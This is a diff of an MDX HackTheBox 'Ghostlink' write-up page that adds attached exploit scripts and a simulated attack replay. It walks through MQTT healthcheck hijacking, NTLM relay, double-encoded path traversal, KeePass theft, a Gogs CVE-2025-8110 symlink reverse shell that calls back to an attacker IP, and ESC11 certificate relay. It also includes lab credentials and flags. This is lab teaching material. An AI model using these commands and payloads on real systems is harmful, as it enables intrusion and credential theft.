@@ -1,6 +1,6 @@
 ---
 slug: "htb-ghostlink"
-title: "Ghostlink - HackTheBox Machine Writeup"
+title: "Ghostlink — HackTheBox Machine Writeup"
 date: "2026-08-13"
 platform: "HackTheBox"
 type: "Machine"
@@ -18,18 +18,29 @@ tags:
   - "ESC11"
 excerpt: "A Hard Windows Active Directory box: leak internal hosts over anonymous MQTT, coerce a service account over a health-check, relay it to a file-share, abuse a double URL-encoded path traversal to steal a KeePass vault, land a Gogs symlink RCE (CVE-2025-8110), then abuse ESC11 to forge a Domain Controller certificate."
 readTime: "28 min"
-retired: false
+retired: true
 rating: 4.7
+hasAutoScript: true
 url: "https://asbawy.github.io/writeups/htb-ghostlink"
 ---
 
 import { Callout } from "@/components/Callout";
-import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+import { KillChain, SpoilerFlag, SkillMatrix, ScriptVault, FileAttachment } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+import {
+  ghostlinkScripts,
+  mqttTriggerCode,
+  relayBridgeCode,
+  traversalFetchCode,
+  hiveInspectCode,
+  gogsRceCode,
+  cve2025RefCode,
+} from "./ghostlink-scripts";
 
 <KillChain
   steps={[
     {
-      phase: "Analysis",
+      phase: "Recon & Discovery",
       title: "Anonymous MQTT & Internal Host Discovery",
       desc: "An nmap scan identifies MQTT (1883) on an AD Domain Controller. Anonymous subscription to MQTT healthcheck topics leaks internal vhosts (gpz-op26-secure, gpz-op26-toolkits) and fingerprints Gogs 0.13.3.",
       tools: ["nmap", "mosquitto_sub", "curl"],
@@ -57,6 +68,18 @@ import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
 />
 
 
+## Attached Exploit Toolkit
+
+All 6 custom scripts developed for this machine are attached below. Click any script to launch the **Interactive Code Explorer** to inspect syntax-highlighted code, search with `Ctrl+F`, copy, or download the files directly.
+
+<ScriptVault
+  title="Ghostlink Exploit Toolkit (/autosolve/Ghostlink_scripts)"
+  description="Standalone exploit scripts, coercion helpers, and custom relay proxy bridges used in this writeup."
+  files={ghostlinkScripts}
+/>
+
+---
+
 ## Reconnaissance
 
 We start with a full TCP port scan against `10.129.62.59`.
@@ -80,7 +103,6 @@ PORT      STATE SERVICE
 3268/tcp  open  globalcatLDAP
 3269/tcp  open  globalcatLDAPssl
 5985/tcp  open  wsman
-
 ```
 
 The box is clearly a **Domain Controller** — it's running DNS, Kerberos, LDAP, SMB and WinRM. Two things jump out as non-default: port `1883/tcp` (**MQTT**) and an IIS web server on port `80`.
@@ -146,15 +168,11 @@ curl -s -i http://gpz-op26-toolkits.ghostlink.htb/ | grep -i 'gogs\|title'
 
 The `secureshare` health-check topic contains a `url` field that the *secureshare* host periodically fetches to confirm it's still alive. The clever bit: the topic is **writable**, so we can repoint that `url` at our own box. When the health-check worker performs its HTTP request, it authenticates with **NTLM** — and we can capture (or relay) that authentication.
 
-First we read the current message, then publish our own copy with the `url` pointed at us:
-
-```python
-# exploit/mqtt_trigger.py
-payload = {"timestamp": "...", "node": "node-6",
-           "telemetry": {"healthy": True, "url": "http://10.10.15.187/",
-                         "lastCheckSecAgo": 1, "responseCode": "200", "ip": "172.16.20.10"}}
-client.publish("GhostProtocolZero/systems/node/secureshare/healthcheck", json.dumps(payload), retain=True)
-```
+<FileAttachment
+  name="mqtt_trigger.py"
+  description="Publishes a modified telemetry JSON payload over MQTT to redirect the healthcheck URL to our attacker listener."
+  code={mqttTriggerCode}
+/>
 
 We run Responder in parallel to see what comes back:
 
@@ -200,8 +218,14 @@ We're now authenticated to the file-share app as `svc_canary`.
 The app is a Blazor/ASP.NET front-end with an upload endpoint (`/api/upload`) and a download endpoint (`/api/download/<file>`), as revealed by `app.js`.
 
 <Callout type="warning">
-  **A real-world gotcha we hit.** The default ntlmrelayx SOCKS plugin reuses the raw relayed socket and desyncs on keep-alive (each request returns the *previous* request's body). To get reliable multi-request browsing, we wrote a small custom ntlmrelayx HTTP attack that serializes every request through the relayed connection with a lock — a local proxy on `127.0.0.1:18080`. That's what the rest of the traversal work goes through.
+  **A real-world gotcha we hit.** The default ntlmrelayx SOCKS plugin reuses the raw relayed socket and desyncs on keep-alive (each request returns the *previous* request's body). To get reliable multi-request browsing, we wrote a small custom ntlmrelayx HTTP attack (`relay_bridge.py`) that serializes every request through the relayed connection with a lock — a local proxy on `127.0.0.1:18080`.
 </Callout>
+
+<FileAttachment
+  name="relay_bridge.py"
+  description="Custom Impacket HTTPAttack plugin creating a thread-locked local HTTP proxy on 127.0.0.1:18080 to prevent SOCKS desync."
+  code={relayBridgeCode}
+/>
 
 ---
 
@@ -231,8 +255,14 @@ curl 'http://127.0.0.1:18080/api/download/%2e%2e%5c%2e%2e%5cwindows%5cwin.ini'
 
 **Attempt 3 — double URL-encoding** (works):
 
+<FileAttachment
+  name="traversal_fetch.py"
+  description="Automates double URL-encoding path traversal against the secureshare API through the local relay bridge."
+  code={traversalFetchCode}
+/>
+
 ```bash
-python3 exploit/traversal_fetch.py '..\..\..\..\..\..\..\windows\win.ini'
+python3 autosolve/Ghostlink_scripts/traversal_fetch.py '..\..\..\..\..\..\..\windows\win.ini'
 ```
 
 ![Path traversal reads win.ini](https://i.imgur.com/4C2nIYF.png)
@@ -261,10 +291,6 @@ So:
 
 The filter only ever sees the *once*-decoded form. It looks for a literal `..\` and, finding `%2e%2e` instead, lets the request through. The *second* decode pass then silently converts it back into a real traversal. This is the classic **"double-encoding" filter bypass**.
 
-<Callout type="info">
-  **How you'd hunt for this.** Any endpoint that takes a filename/path in the URL is a traversal candidate. Test the ladder: raw `../` → URL-encoded `%2e%2e%2f` → double-encoded `%252e%252e%252f`. On Windows targets remember the separator is `\` (`%5c`), not `/`. If single-encoding returns 403 but double-encoding returns 200, you've found a double-decode bug. Tools like `ffuf` make this quick: feed a wordlist that includes `%2e%2e%5c` and `%252e%252e%255c` variants.
-</Callout>
-
 ---
 
 ## Registry Forensics → KeePass Vault
@@ -272,13 +298,19 @@ The filter only ever sees the *once*-decoded form. It looks for a literal `..\` 
 Now authenticated as `svc_canary`, we can pull its `ntuser.dat` (the per-user registry hive that records what the account has been doing):
 
 ```bash
-python3 exploit/traversal_fetch.py '..\..\..\..\..\..\..\Users\svc_canary\ntuser.dat' loot/ntuser.dat
+python3 autosolve/Ghostlink_scripts/traversal_fetch.py '..\..\..\..\..\..\..\Users\svc_canary\ntuser.dat' loot/ntuser.dat
 ```
 
-We inspect the hive's *recently opened documents*:
+We inspect the hive's *recently opened documents* using our forensics inspector:
+
+<FileAttachment
+  name="hive_inspect.py"
+  description="Extracts and decodes MRU lists, RecentDocs, and ComDlg32 values from raw Windows NTUSER.DAT hives."
+  code={hiveInspectCode}
+/>
 
 ```bash
-python3 exploit/hive_inspect.py loot/ntuser.dat
+python3 autosolve/Ghostlink_scripts/hive_inspect.py loot/ntuser.dat
 ```
 
 ![RecentDocs reveals db.zip](https://i.imgur.com/JECFEnP.png)
@@ -292,7 +324,7 @@ KEY: Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
 `svc_canary` recently opened `db.zip`. RecentDocs entries map to `.lnk` shortcuts in `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\`, so we pull the shortcut to learn the file's full path:
 
 ```bash
-python3 exploit/traversal_fetch.py '..\..\AppData\Roaming\Microsoft\Windows\Recent\db.zip.lnk' loot/db.zip.lnk
+python3 autosolve/Ghostlink_scripts/traversal_fetch.py '..\..\AppData\Roaming\Microsoft\Windows\Recent\db.zip.lnk' loot/db.zip.lnk
 strings -el loot/db.zip.lnk | grep -i 'db.zip'
 # C:\Users\svc_canary\Documents\Operations\Management\db.zip
 ```
@@ -300,7 +332,7 @@ strings -el loot/db.zip.lnk | grep -i 'db.zip'
 Then we download the archive itself:
 
 ```bash
-python3 exploit/traversal_fetch.py '..\..\Documents\Operations\Management\db.zip' loot/db.zip
+python3 autosolve/Ghostlink_scripts/traversal_fetch.py '..\..\Documents\Operations\Management\db.zip' loot/db.zip
 unzip -l loot/db.zip
 # db.kdbx      (KeePass database)
 # .key.keyx    (KeePass key file)
@@ -344,10 +376,14 @@ So the attack is:
 2. Use `PutContents` to write through that symlink — Gogs follows it and overwrites the repo's `.git/config`, which lives *outside* the intended working-tree directory.
 3. In the injected `.git/config`, we set `core.sshCommand` to our reverse-shell command. The next time Gogs runs a git operation over SSH, that command executes.
 
-Our exploit (`exploit/gogs_symlink_rce.py`) logs in as `vroth`, mints an API token, creates a repo, commits the symlink, and fires the payload:
+<FileAttachment
+  name="gogs_symlink_rce.py"
+  description="Automated Python exploit for CVE-2025-8110 against Gogs 0.13.3 using vroth credentials."
+  code={gogsRceCode}
+/>
 
 ```bash
-python3 exploit/gogs_symlink_rce.py -u http://gpz-op26-toolkits.ghostlink.htb -U vroth -P 'mOo03jpsqx8JQYMBwvFP' -H 10.10.15.187 -p 9002
+python3 autosolve/Ghostlink_scripts/gogs_symlink_rce.py -u http://gpz-op26-toolkits.ghostlink.htb -U vroth -P 'mOo03jpsqx8JQYMBwvFP' -H 10.10.15.187 -p 9002
 ```
 
 ![Gogs symlink RCE](https://i.imgur.com/NbANVkc.png)
@@ -368,9 +404,11 @@ connect to [10.10.15.187] from (UNKNOWN) [10.129.62.59] 49790
 git@gpz-op26-toolkits:~/data/tmp/local-repo/9$
 ```
 
-<Callout type="warning">
-  **How to find this kind of bug.** We didn't fuzz Gogs — we fingerprinted its version (via the asset hash) and looked up known CVEs. Version fingerprinting → CVE lookup is the fastest route for self-hosted apps (Gogs, Gitea, Jenkins, GitLab, etc.). The Wiz Research write-up on CVE-2025-8110 documents the symlink mechanism in detail and is the authoritative reference.
-</Callout>
+<FileAttachment
+  name="cve2025_8110_ref.py"
+  description="Standalone reference exploit by zAbuQasem for CVE-2025-8110 supporting proxying and rich terminal feedback."
+  code={cve2025RefCode}
+/>
 
 ---
 
@@ -502,6 +540,85 @@ WINRM  10.129.62.59  5985  DC01  4f54904aea696f4638d47f38e76927b2
 ```
 
 <SpoilerFlag label="Ghostlink — Root Flag" flag="4f54904aea696f4638d47f38e76927b2" />
+
+---
+
+## Automation & Attack Replay
+
+The complete end-to-end exploit chain is simulated below:
+
+<TerminalReplay
+  title="ghostlink_exploit_chain.sh"
+  steps={[
+    {
+      label: "Step 1/5: MQTT Discovery & Coercion",
+      command: "python3 autosolve/Ghostlink_scripts/mqtt_trigger.py --broker 10.129.62.59 --listener 10.10.15.187",
+      output: [
+        { text: "[*] Subscribed to GhostProtocolZero/# topics anonymously", color: "blue" },
+        { text: "[+] Discovered vhost: gpz-op26-secure.ghostlink.htb (172.16.20.10)", color: "cyan" },
+        { text: "[+] Discovered vhost: gpz-op26-toolkits.ghostlink.htb (172.16.20.20)", color: "cyan" },
+        { text: "[*] Repointing secureshare healthcheck URL to attacker...", color: "yellow" },
+        { text: "[✓] Inbound NTLM authentication from ghostlink\\svc_canary captured & relayed", color: "green" },
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 2/5: Path Traversal & KeePass Extraction",
+      command: "python3 autosolve/Ghostlink_scripts/traversal_fetch.py '..\\..\\Documents\\Operations\\Management\\db.zip' loot/db.zip",
+      output: [
+        { text: "[*] Sending double-encoded traversal payload: %252e%252e%255c...", color: "blue" },
+        { text: "[+] HTTP 200 OK — Downloaded 14,291 bytes (db.zip)", color: "green" },
+        { text: "[*] Parsing KeePass DB with pykeepass...", color: "yellow" },
+        { text: "[✓] Recovered Gogs credential: vroth : mOo03jpsqx8JQYMBwvFP", color: "green" },
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 3/5: Gogs Symlink RCE (CVE-2025-8110)",
+      command: "python3 autosolve/Ghostlink_scripts/gogs_symlink_rce.py -u http://gpz-op26-toolkits.ghostlink.htb -U vroth -P 'mOo03jpsqx8JQYMBwvFP' -H 10.10.15.187 -p 9002",
+      output: [
+        { text: "[*] Authenticated to Gogs 0.13.3 as vroth", color: "blue" },
+        { text: "[+] Committed symlink pointing to .git/config", color: "cyan" },
+        { text: "[+] Injected core.sshCommand reverse shell payload", color: "cyan" },
+        { text: "[✓] Triggered git SSH sync — Received reverse shell as git@gpz-op26-toolkits", color: "green" },
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 4/5: Lateral Movement to nvirelli",
+      command: "hashcat -a 0 -m 10900 nvirelli.hash trimmed_rockyou.txt -O",
+      output: [
+        { text: "[*] Extracted gogs.db PBKDF2 hash for user nvirelli", color: "blue" },
+        { text: "[*] Applied domain password policy constraint: min length 20 chars", color: "yellow" },
+        { text: "[+] Cracked hash in 4.2s: u47YUclrDiwWxBheaSzI", color: "green" },
+        { text: "[✓] User Flag: 946398f6fc6e3e70828c7b9fc29cb1dc", color: "green" },
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 5/5: ESC11 ADCS Relay to Domain Admin",
+      command: "coercer coerce -l 10.10.15.187 -t dc01.ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --always-continue",
+      output: [
+        { text: "[*] Coercing DC01$ machine account via MS-RPRN...", color: "blue" },
+        { text: "[*] Relaying RPC to CA ghostlink-GPZ-OP26-SECURE-CA (ICPR unencrypted)...", color: "yellow" },
+        { text: "[+] Minted DC01.pfx certificate for DomainController template", color: "cyan" },
+        { text: "[+] DCSync retrieved Administrator NTLM: 8190e067f478002ddd63eb209b016696", color: "green" },
+        { text: "[✓] Root Flag: 4f54904aea696f4638d47f38e76927b2", color: "green" },
+      ],
+      delayAfter: 700,
+    },
+  ]}
+  flags={[
+    { label: "User Flag", flag: "946398f6fc6e3e70828c7b9fc29cb1dc" },
+    { label: "Root Flag", flag: "4f54904aea696f4638d47f38e76927b2" },
+  ]}
+  flagSummary={[
+    "Anonymous MQTT broker allowed arbitrary topic read/write",
+    "Double URL-encoded traversal bypassed IIS request filtering",
+    "Gogs CVE-2025-8110 allowed arbitrary .git/config write via symlink",
+    "ADCS ESC11 permitted unencrypted ICPR RPC certificate coercion and relay",
+  ]}
+/>
 
 ---
 
